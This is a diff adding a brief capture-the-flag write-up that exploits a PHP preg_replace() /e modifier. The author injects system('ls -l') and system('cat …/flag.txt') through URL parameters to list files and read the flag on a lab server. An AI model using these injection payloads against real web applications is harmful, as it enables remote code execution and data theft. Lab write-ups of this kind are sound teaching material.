@@ -1,0 +1,9 @@
+after accessing the address url, we see there is a problem and they are asking to replace Admin.
+php is vulnerable to preg_replace() so we can try ls -l to check if there is anything else
+we can try modifying the url, http://ip/index.php?vector=/Admin/e&replace=system('ls -l')
+now we see a folder named "here_we_dont_have_flag" 
+by modifying the url again, http://ip/index.php?vector=/Admin/e&replace=system('ls -l here_we_dont_have_flag')
+we now see a flag.txt so we can now access the file with cat command.
+http://ip/index.php?vector=/Admin/e&replace=system('cat here_we_dont_have_flag/flag.txt')
+
+vulnerability: remote code execution 
